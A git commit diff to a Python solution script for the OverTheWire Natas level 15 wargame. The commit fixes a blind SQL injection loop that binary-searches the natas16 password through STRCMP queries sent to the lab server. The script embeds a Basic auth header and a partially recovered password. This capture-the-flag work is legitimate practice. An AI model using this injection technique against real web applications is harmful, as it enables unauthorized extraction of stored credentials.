36c807b3863b55189221e11c7d0ec5aff9d2fdcc
t1mgit <malt-b-tire@protonmail.com>
2023-04-17 20:58:47 +1000

    Fixed some error in natas15_inject_with_urllib.py Updated natas with new password for level 15

--- OverTheWireWargames/Natas/natas15_inject_with_urllib.py
+++ OverTheWireWargames/Natas/natas15_inject_with_urllib.py
@@ -1,9 +1,8 @@
 import regex
-import math
 import time
 import urllib.request
 #generate list of characters
-chars=['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','r','s','t','u','v','w','x','y','z']
+chars=['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
 r_ex=regex.escape("HTTP/1.1 200 OK")
 lt_ex=regex.escape("This user exists")
 gt_ex=regex.escape("This user doesn't exist")
@@ -23,25 +22,25 @@ r=urllib.request.urlopen(req)
 
 #we need to make effective request in a loop up to 32 characters long for the length of the password
 # we also  should used a halving algorith to quickly find each letter
-#pwd=""
-pwd="TRD7iZrd5GATjj9PkPEua0V"
-#pwd="TRD7iZrd5"
+pwd=""
+#pwd="TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
+
 
 lbound=0
-ubound=len(chars)
+ubound=(len(chars)-1)
 new_c=""
 for c in range(0,32):
 	lbound=0
-	ubound=len(chars)-1
+	ubound=(len(chars)-1)
 	while True:
-		mid=math.floor((ubound+lbound)/2)
+		mid=((ubound+lbound)//2) #floor division
 		print("LB={0} Mid={1} UB={2}".format(lbound,mid,ubound),end=" ")
 		if lbound==mid:
 			print("\nFound:"+chars[mid],end="\n\n")
 			pwd=pwd+chars[mid]
 			break
 		new_c=pwd+chars[mid]
-		req=urllib.request.Request("http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20AND%20STRCMP(BINARY%20\""+new_c+"\",password)<1%20--%20&debug=1")
+		req=urllib.request.Request("http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20AND%20STRCMP(BINARY%20\""+new_c+"\",password)<0%20--%20&debug=1")
 		req.add_header('Authorization','Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==')
 		r=urllib.request.urlopen(req)
 		print("HTTP GET Status={0}".format(r.status))
@@ -62,6 +61,6 @@ for c in range(0,32):
 		#else:
 			#print("Negative match fail")
 		regex.purge()
-		time.sleep(2)
+		time.sleep(1.0)
 #we have a request that can  use looping to  slowy get the password, try every letter until
 print(buf.decode("utf-8"))
